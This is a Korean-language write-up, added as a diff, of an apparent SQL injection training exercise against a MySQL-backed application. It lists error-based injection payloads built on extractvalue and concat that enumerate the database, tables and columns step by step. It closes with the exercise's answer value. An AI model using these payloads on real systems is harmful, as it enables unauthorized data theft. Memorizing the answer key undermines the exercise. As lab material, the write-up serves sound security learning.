@@ -1,0 +1,36 @@
+================================
+* SQL Injection 문제 6번 MySQL
+================================
+
+1. 공격 과정
+공격 쿼리문 유추
+- EQST%' and extractvalue(1,concat(0x3a,(____서브쿼리___)))=1 and 'j%'='j
+공격 포인트
+- EQST%' and extractvalue(1,concat(0x3a,version()))=1 and 'j%'='j 입력을 통해 MySQL 버전 정보 출력되는 것을 확인
+
+db이름 확인
+EQST%' and extractvalue('1', concat(0x3a, (select database()))) and '1'='1 (db명이 skinfosec인 것을 확인)
+
+테이블 확인
+EQST%' and extractvalue('1',concat(0x3a, (select table_name from information_schema.tables where table_schema='skinfosec' limit 0,1))) and 'j%'='j
+(skinfosec db에는 access_log라는 테이블이 존재하는 것을 확인)
+결과가 여러 개이면 에러 발생하므로 limit 사용하여 하나씩 출력(오라클의 order by하던거와 비슷한 개념)
+테이블 1 : access_log
+테이블 2 : comm_file
+테이블 3 : comm_mdi_file
+테이블 4 : eqst_answer -> 정답으로 예상 가능한 테이블 확인
+
+컬럼 확인
+EQST%' and extractvalue('1',concat(0x3a, (select column_name from information_schema.columns where table_name = 'eqst_answer' limit 0,1))) and 'j%'='j
+(SEQ 컬럼 확인 됨)
+결과가 여러 개이면 에러 발생하므로 limit 사용하여 하나씩 출력
+컬럼 1 : answer_column -> 정답으로 예상 가능한 컬럼 확인
+컬럼 2 : 존재하지 않음
+
+eqst_answer테이블의 answer_column컬럼 데이터 확인
+EQST%' and extractvalue('1',concat(0x3a, (select answer_column from eqst_answer limit 0,1))) and 'j%'='j
+error code : [1105] XPATH syntax error: ':skinfosec_eqst_lms_system' 에러메세지 출력
+
+2. 정답
+skinfosec_eqst_lms_system
+================================
